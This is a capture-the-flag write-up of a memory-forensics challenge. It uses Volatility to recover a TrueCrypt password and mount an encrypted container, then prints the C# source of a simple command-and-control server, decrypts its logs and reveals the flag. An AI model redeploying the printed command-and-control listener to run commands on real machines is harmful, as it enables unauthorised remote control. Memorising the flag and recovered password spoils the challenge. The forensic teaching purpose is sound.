# Forensics

## Description

Our cybercrime unit has been investigating a well-known APT group for several months. The group has been responsible for several high-profile attacks on corporate organizations. However, what is interesting about that case, is that they have developed a custom command & control server of their own. Fortunately, our unit was able to raid the home of the leader of the APT group and take a memory capture of his computer while it was still powered on. Analyze the capture to try to find the source code of the server.

## Source

```bash
➜ 7z l .\TrueSecrets.zip
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2022-12-14 19:34:32 .....    209649664     78802404  TrueSecrets.raw
------------------- ----- ------------ ------------  ------------------------
2022-12-14 19:34:32          209649664     78802404  1 files
➜ 7z x .\TrueSecrets.zip -p'hackthebox'
└─$ file TrueSecrets.raw
TrueSecrets.raw: data
```

## Solution

Because this is a memory dump [volatility](https://github.com/volatilityfoundation/volatility3) will be very useful.

Get some information about dump:
```powershell
└─$ vol3 -f TrueSecrets.raw windows.info.Info | tee windows.info.log
Volatility 3 Framework 2.7.0
Progress:  100.00               PDB scanning finished
Variable        Value

Kernel Base     0x82606000
DTB     0x185000
Symbols file:///home//.local/lib/python3.11/site-packages/volatility3/symbols/windows/ntkrpamp.pdb/92D32EE7188A4CB3AB23EDA0CB0F9D7B-2.json.xz
Is64Bit False
IsPAE   True
layer_name      0 WindowsIntelPAE
memory_layer    1 FileLayer
KdDebuggerDataBlock     0x82732c78
NTBuildLab      7601.23915.x86fre.win7sp1_ldr.17
CSDVersion      1
KdVersionBlock  0x82732c50
Major/Minor     15.7601
MachineType     332
KeNumberProcessors      1
SystemTime      2022-12-14 21:33:30
NtSystemRoot    C:\Windows
NtProductType   NtProductWinNt
NtMajorVersion  6
NtMinorVersion  1
PE MajorOperatingSystemVersion  6
PE MinorOperatingSystemVersion  1
PE Machine      332
PE TimeDateStamp        Wed Sep 13 14:47:57 2017
```

Get running processes:
```powershell
└─$ vol3 -f TrueSecrets.raw windows.pstree | tee windows.pstree.log
Volatility 3 Framework 2.7.0    PDB scanning finished

PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        Audit   Cmd     Path

4       0       System  0x8378ed28      87      475     N/A     False   2022-12-15 06:08:19.000000      N/A     -       -       -
* 252   4       smss.exe        0x83e7e020      2       29      N/A     False   2022-12-15 06:08:19.000000      N/A     \Device\HarddiskVolume1\Windows\System32\smss.exe       \SystemRoot\System32\smss.exe   \SystemRoot\System32\smss.exe
320     312     csrss.exe       0x843cf980      9       375     0       False   2022-12-15 06:08:19.000000      N/A     \Device\HarddiskVolume1\Windows\System32\csrss.exe      %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16  C:\Windows\system32\csrss.exe
356     312     wininit.exe     0x837f6280      3       79      0       False   2022-12-15 06:08:19.000000      N/A     \Device\HarddiskVolume1\Windows\System32\wininit.exe    -       -
* 476   356     lsm.exe 0x8445f030      10      142     0       False   2022-12-15 06:08:19.000000      N/A     \Device\HarddiskVolume1\Windows\System32\lsm.exe        C:\Windows\system32\lsm.exe     C:\Windows\system32\lsm.exe
* 468   356     lsass.exe       0x8445e030      7       591     0       False   2022-12-15 06:08:19.000000      N/A     \Device\HarddiskVolume1\Windows\System32\lsass.exe      C:\Windows\system32\lsass.exe   C:\Windows\system32\lsass.exe
* 452   356     services.exe    0x844577a0      9       213     0       False   2022-12-15 06:08:19.000000      N/A     \Device\HarddiskVolume1\Windows\System32\services.exe   C:\Windows\system32\services.exe C:\Windows\system32\services.exe
** 644  452     VBoxService.ex  0x844a2030      11      116     0       False   2022-12-15 06:08:19.000000      N/A     \Device\HarddiskVolume1\Windows\System32\VBoxService.exe        C:\Windows\System32\VBoxService.exe       C:\Windows\System32\VBoxService.exe
** 904  452     svchost.exe     0x845fcd28      15      311     0       False   2022-12-14 21:08:21.000000      N/A     \Device\HarddiskVolume1\Windows\System32\svchost.exe    C:\Windows\system32\svchost.exe -k LocalService   C:\Windows\system32\svchost.exe
** 1680 452     svchost.exe     0x8e10d998      14      224     0       False   2022-12-14 21:08:22.000000      N/A     \Device\HarddiskVolume1\Windows\System32\svchost.exe    C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation C:\Windows\system32\svchost.exe
** 2580 452     taskhost.exe    0x8e1ef208      5       86      1       False   2022-12-14 21:13:01.000000      N/A     \Device\HarddiskVolume1\Windows\System32\taskhost.exe   -       -
** 928  452     svchost.exe     0x84484d28      23      956     0       False   2022-12-14 21:08:21.000000      N/A     \Device\HarddiskVolume1\Windows\System32\svchost.exe    C:\Windows\system32\svchost.exe -k netsvcs        C:\Windows\system32\svchost.exe
** 696  452     svchost.exe     0x844ab478      7       243     0       False   2022-12-14 21:08:21.000000      N/A     \Device\HarddiskVolume1\Windows\System32\svchost.exe    C:\Windows\system32\svchost.exe -k RPCSS  C:\Windows\system32\svchost.exe
** 584  452     svchost.exe     0x84488030      10      347     0       False   2022-12-15 06:08:19.000000      N/A     \Device\HarddiskVolume1\Windows\System32\svchost.exe    C:\Windows\system32\svchost.exe -k DcomLaunch     C:\Windows\system32\svchost.exe
*** 2332        584     WmiPrvSE.exe    0x83911848      5       112     0       False   2022-12-14 21:12:23.000000      N/A     \Device\HarddiskVolume1\Windows\System32\wbem\WmiPrvSE.exe      C:\Windows\system32\wbem\wmiprvse.exe     C:\Windows\system32\wbem\wmiprvse.exe
** 1352 452     taskhost.exe    0x8e0a2658      9       223     1       False   2022-12-14 21:08:22.000000      N/A     \Device\HarddiskVolume1\Windows\System32\taskhost.exe   "taskhost.exe"  C:\Windows\system32\taskhost.exe
** 2760 452     svchost.exe     0x91865790      13      362     0       False   2022-12-14 21:10:23.000000      N/A     \Device\HarddiskVolume1\Windows\System32\svchost.exe    C:\Windows\System32\svchost.exe -k secsvcs        C:\Windows\System32\svchost.exe
** 1228 452     spoolsv.exe     0x8e0525b0      13      275     0       False   2022-12-14 21:08:21.000000      N/A     \Device\HarddiskVolume1\Windows\System32\spoolsv.exe    C:\Windows\System32\spoolsv.exe C:\Windows\System32\spoolsv.exe
** 856  452     SearchIndexer.  0x8e06f2d0      13      626     0       False   2022-12-14 21:08:28.000000      N/A     \Device\HarddiskVolume1\Windows\System32\SearchIndexer.exe      C:\Windows\system32\SearchIndexer.exe /Embedding  C:\Windows\system32\SearchIndexer.exe
** 1116 452     svchost.exe     0x8e030a38      18      398     0       False   2022-12-14 21:08:21.000000      N/A     \Device\HarddiskVolume1\Windows\System32\svchost.exe    C:\Windows\system32\svchost.exe -k NetworkService C:\Windows\system32\svchost.exe
** 864  452     svchost.exe     0x845f5030      16      399     0       False   2022-12-14 21:08:21.000000      N/A     \Device\HarddiskVolume1\Windows\System32\svchost.exe    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted   C:\Windows\System32\svchost.exe
*** 1448        864     dwm.exe 0x844d2d28      3       69      1       False   2022-12-14 21:08:22.000000      N/A     \Device\HarddiskVolume1\Windows\System32\dwm.exe        -       -
** 992  452     svchost.exe     0x8e013488      5       114     0       False   2022-12-14 21:08:21.000000      N/A     \Device\HarddiskVolume1\Windows\System32\svchost.exe    -       -
** 352  452     sppsvc.exe      0x8e1cd8d0      4       144     0       False   2022-12-14 21:08:23.000000      N/A     \Device\HarddiskVolume1\Windows\System32\sppsvc.exe     -       -
** 1632 452     svchost.exe     0x8e1f6a40      5       91      0       False   2022-12-14 21:08:23.000000      N/A     \Device\HarddiskVolume1\Windows\System32\svchost.exe    -       -
** 1636 452     svchost.exe     0x8e1023a0      10      183     0       False   2022-12-14 21:08:22.000000      N/A     \Device\HarddiskVolume1\Windows\System32\svchost.exe    C:\Windows\System32\svchost.exe -k utcsvc C:\Windows\System32\svchost.exe
** 752  452     svchost.exe     0x844c3030      18      457     0       False   2022-12-14 21:08:21.000000      N/A     \Device\HarddiskVolume1\Windows\System32\svchost.exe    C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted  C:\Windows\System32\svchost.exe
** 1776 452     wlms.exe        0x8e07d900      4       45      0       False   2022-12-14 21:08:22.000000      N/A     \Device\HarddiskVolume1\Windows\System32\wlms\wlms.exe  -       -
** 1268 452     svchost.exe     0x84477d28      19      337     0       False   2022-12-14 21:08:21.000000      N/A     \Device\HarddiskVolume1\Windows\System32\svchost.exe    C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork  C:\Windows\system32\svchost.exe
368     348     csrss.exe       0x84402d28      7       203     1       False   2022-12-15 06:08:19.000000      N/A     \Device\HarddiskVolume1\Windows\System32\csrss.exe      %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16  C:\Windows\system32\csrss.exe
* 272   368     conhost.exe     0x83c0a030      2       34      1       False   2022-12-14 21:33:28.000000      N/A     \Device\HarddiskVolume1\Windows\System32\conhost.exe    \??\C:\Windows\system32\conhost.exe "-180402527637560752-8319479621992226886-774806053592412399-20651748-1013740728       C:\Windows\system32\conhost.exe
396     348     winlogon.exe    0x84409030      3       110     1       False   2022-12-15 06:08:19.000000      N/A     \Device\HarddiskVolume1\Windows\System32\winlogon.exe   -       -
1464    1436    explorer.exe    0x8e0d3a40      32      1069    1       False   2022-12-14 21:08:22.000000      N/A     \Device\HarddiskVolume1\Windows\explorer.exe    C:\Windows\Explorer.EXE C:\Windows\Explorer.EXE
* 1832  1464    VBoxTray.exe    0x83825540      12      140     1       False   2022-12-14 21:08:22.000000      N/A     \Device\HarddiskVolume1\Windows\System32\VBoxTray.exe   "C:\Windows\System32\VBoxTray.exe"        C:\Windows\System32\VBoxTray.exe
* 2128  1464    TrueCrypt.exe   0x91892030      4       262     1       False   2022-12-14 21:08:31.000000      N/A     \Device\HarddiskVolume1\Program Files\TrueCrypt\TrueCrypt.exe   "C:\Program Files\TrueCrypt\TrueCrypt.exe"        C:\Program Files\TrueCrypt\TrueCrypt.exe
* 3212  1464    DumpIt.exe      0x83c1d030      2       38      1       False   2022-12-14 21:33:28.000000      N/A     \Device\HarddiskVolume1\Users\IEUser\Downloads\DumpIt.exe       "C:\Users\IEUser\Downloads\DumpIt.exe"    C:\Users\IEUser\Downloads\DumpIt.exe
* 2176  1464    7zFM.exe        0x8382f198      3       135     1       False   2022-12-14 21:22:44.000000      N/A     \Device\HarddiskVolume1\Program Files\7-Zip\7zFM.exe    "C:\Program Files\7-Zip\7zFM.exe" "C:\Users\IEUser\Documents\backup_development.zip"      C:\Program Files\7-Zip\7zFM.exe
```

Backup seems interesting:
```bash
* 2176  1464    7zFM.exe        0x8382f198      3       135     1       False   2022-12-14 21:22:44.000000      N/A     \Device\HarddiskVolume1\Program Files\7-Zip\7zFM.exe    "C:\Program Files\7-Zip\7zFM.exe" "C:\Users\IEUser\Documents\backup_development.zip"      C:\Program Files\7-Zip\7zFM.exe
```

Scan for files to get offset:
```bash
└─$ vol3 -f TrueSecrets.raw windows.filescan | tee windows.filescan.log
Volatility 3 Framework 2.7.0    PDB scanning finished

Offset  Name    Size
0xbbf6158       \Users\IEUser\Documents\backup_development.zip  128
```

```bash
└─$ mkdir backup_development && cd $_
└─$ vol3 -f ../TrueSecrets.raw windows.dumpfiles --physaddr 0xbbf6158 | tee windows.dumpfiles.backup_development.log
Volatility 3 Framework 2.7.0
Progress:  100.00               PDB scanning finished
Cache   FileObject      FileName        Result

DataSectionObject       0xbbf6158       backup_development.zip  file.0xbbf6158.0x839339d0.DataSectionObject.backup_development.zip.dat
SharedCacheMap  0xbbf6158       backup_development.zip  file.0xbbf6158.0x9185db40.SharedCacheMap.backup_development.zip.vacb
└─$ unzip file.0xbbf6158.0x839339d0.DataSectionObject.backup_development.zip.dat
Archive:  file.0xbbf6158.0x839339d0.DataSectionObject.backup_development.zip.dat
 extracting: development.tc
└─$ file development.tc
development.tc: data
```

We saw `TrueCrypt.exe` which suggest that the development is probably encrypted with it.

We can try to crack the password, but john came empty handed.
```
└─$ truecrypt2john development.tc > development.hash
➜ .\john-1.9.0-jumbo-1-win64\run\john.exe .\hashes --wordlist=.\rockyou.txt
```

Volatility**2** has a plugin to recover TrueCrypt details: [Open an encrypted Truecrypt volume](https://heisenberk.github.io/Open-Encrypted-Truecrypt-Volume/)

```bash
# NTBuildLab      7601.23915.x86fre.win7sp1_ldr.17
└─$ vol2 -f TrueSecrets.raw --profile=Win7SP1x86 truecryptsummary
Volatility Foundation Volatility Framework 2.6
Password             X2Hk2XbEJqWYsh8VdbSYg6WpG9g7 at offset 0x89ebf064
Process              TrueCrypt.exe at 0x91892030 pid 2128
Service              truecrypt state SERVICE_RUNNING
Kernel Module        truecrypt.sys at 0x89e8b000 - 0x89ec2000
Symbolic Link        D: -> \Device\TrueCryptVolumeD mounted 2022-12-14 21:33:00 UTC+0000
Symbolic Link        Volume{d22d7a9d-7b72-11ed-b81d-0800273bf313} -> \Device\TrueCryptVolumeD mounted 2022-12-14 21:10:21 UTC+0000
Symbolic Link        D: -> \Device\TrueCryptVolumeD mounted 2022-12-14 21:33:00 UTC+0000
Driver               \Driver\truecrypt at 0xbe6b780 range 0x89e8b000 - 0x89ec1b80
Device               TrueCryptVolumeD at 0x8391b9b0 type FILE_DEVICE_DISK
Container            Path: \??\C:\Users\IEUser\Documents\development.tc
Device               TrueCrypt at 0x83e6b600 type FILE_DEVICE_UNKNOWN
```

Download VeraCrypt [https://www.veracrypt.fr/en/Downloads.html](https://www.veracrypt.fr/en/Downloads.html). TrueCrypt is not supported software anymore, but VeraCrypt has some backwards compatibility.

```bash
└─$ sudo dpkg -i veracrypt-1.26.14-Debian-12-amd64.deb
└─$ sudo apt --fix-broken install
```

💀 The latest version doesn't support TrueCrypt anymore..  [Can VeraCrypt open an old TrueCrypt container?](https://superuser.com/a/1810962)

Supported version: [https://www.veracrypt.fr/en/Downloads_1.25.9.html](https://www.veracrypt.fr/en/Downloads_1.25.9.html)

```bash
└─$ sudo dpkg --purge veracrypt
└─$ sudo dpkg -i veracrypt-1.25.9-Debian-12-amd64.deb
```

`Mount > paste password > Ok`

![truesecrets.png](/assets/ctf/htb/forensics/truesecrets.png)

```bash
└─$ cd /media/veracrypt1/
└─$ lta
drwx------    - woyag 31 Dec  1969  .
drwx------    - woyag 13 Dec  2022 ├──  $RECYCLE.BIN
.rwx------  129 woyag 13 Dec  2022 │  └──  desktop.ini
drwx------    - woyag 13 Dec  2022 └──  malware_agent
.rwx------ 2.1k woyag 13 Dec  2022    ├── 󰌛 AgentServer.cs
drwx------    - woyag 13 Dec  2022    └──  sessions
.rwx------  549 woyag 13 Dec  2022       ├──  5818acbe-68f1-4176-a2f2-8c6bcb99f9fa.log.enc
.rwx------  549 woyag 13 Dec  2022       ├──  c65939ad-5d17-43d5-9c3a-29c6a7c31a32.log.enc
.rwx------  734 woyag 13 Dec  2022       └──  de008160-66e4-4d51-8264-21cbc27661fc.log.enc
```

```cs
using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Security.Cryptography;

class AgentServer {

  static void Main(String[] args) {
    var localPort = 40001;
    IPAddress localAddress = IPAddress.Any;
    TcpListener listener = new TcpListener(localAddress, localPort);
    listener.Start();
    Console.WriteLine("Waiting for remote connection from remote agents (infected machines)...");

    TcpClient client = listener.AcceptTcpClient();
    Console.WriteLine("Received remote connection");
    NetworkStream cStream = client.GetStream();

    string sessionID = Guid.NewGuid().ToString();

    while (true) {
      string cmd = Console.ReadLine();
      byte[] cmdBytes = Encoding.UTF8.GetBytes(cmd);
      cStream.Write(cmdBytes, 0, cmdBytes.Length);

      byte[] buffer = new byte[client.ReceiveBufferSize];
      int bytesRead = cStream.Read(buffer, 0, client.ReceiveBufferSize);
      string cmdOut = Encoding.ASCII.GetString(buffer, 0, bytesRead);

      string sessionFile = sessionID + ".log.enc";
      File.AppendAllText(@ "sessions\" + sessionFile, 
        Encrypt(
          "Cmd: " + cmd + Environment.NewLine + cmdOut
        ) + Environment.NewLine
      );
    }
  }

  private static string Encrypt(string pt) {
    string key = "AKaPdSgV";
    string iv = "QeThWmYq";
    byte[] keyBytes = Encoding.UTF8.GetBytes(key);
    byte[] ivBytes = Encoding.UTF8.GetBytes(iv);
    byte[] inputBytes = System.Text.Encoding.UTF8.GetBytes(pt);

    using(DESCryptoServiceProvider dsp = new DESCryptoServiceProvider()) {
      var mstr = new MemoryStream();
      var crystr = new CryptoStream(mstr, dsp.CreateEncryptor(keyBytes, ivBytes), CryptoStreamMode.Write);
      crystr.Write(inputBytes, 0, inputBytes.Length);
      crystr.FlushFinalBlock();
      return Convert.ToBase64String(mstr.ToArray());
    }
  }
}
```

Decode the encrypted files because we have Key and IV in plaintext.
```python
from pathlib import Path
from Crypto.Cipher import DES
import base64

def decrypt(ciphertext):
    # Define key and IV (same as in C#)
    key = b"AKaPdSgV"  
    iv = b"QeThWmYq"   

    encrypted_data = base64.b64decode(ciphertext)
    des = DES.new(key, DES.MODE_CBC, iv)
    decrypted_data = des.decrypt(encrypted_data)

    # Unpad (since DES uses block cipher mode)
    def unpad(s): return s[:-s[-1]]
    decrypted_data = unpad(decrypted_data)

    return decrypted_data.decode()

for path in Path('./sessions').glob('*'):
    with open(path) as f:
        for line in f:
            plaintext = decrypt(line)
            print(plaintext)
```

```powershell
Cmd: hostname
DESKTOP-MRL1A9O
Cmd: whoami
desktop-mrl1a9o\john
Cmd: dir c:\users\john\documents
 Volume in drive C is Windows 7
 Volume Serial Number is 1A9Q-0313
 Directory of C:\Users\john\Documents
12/13/2022  08:15 AM    <DIR>          .
12/13/2022  08:15 AM    <DIR>          ..
               0 File(s)              0 bytes
               2 Dir(s)  25,422,577,664 bytes free
Cmd: hostname
DESKTOP-MRL1A9O
Cmd: whoami
desktop-mrl1a9o\paul
Cmd: dir c:\users\paul\documents
 Volume in drive C is Windows 7
 Volume Serial Number is 1A9Q-0313
 Directory of C:\Users\paul\Documents
12/13/2022  08:15 AM    <DIR>          .
12/13/2022  08:15 AM    <DIR>          ..
               0 File(s)              0 bytes
               2 Dir(s)  25,422,577,664 bytes free
Cmd: hostname
DESKTOP-MRL1A9O
Cmd: whoami
desktop-mrl1a9o\greg
Cmd: dir c:\users\greg\documents
 Volume in drive C is Windows 7
 Volume Serial Number is 1A9Q-0313
 Directory of C:\Users\greg\Documents
12/13/2022  09:07 AM    <DIR>          .
12/13/2022  09:07 AM    <DIR>          ..
12/13/2022  09:15 AM                41 flag.txt
               1 File(s)             41 bytes
               2 Dir(s)  25,326,063,616 bytes free
Cmd: type c:\users\greg\documents\flag.txt
HTB{570r1ng_53cr37_1n_m3m0ry_15_n07_g00d}
```

> Flag: `HTB{570r1ng_53cr37_1n_m3m0ry_15_n07_g00d}`

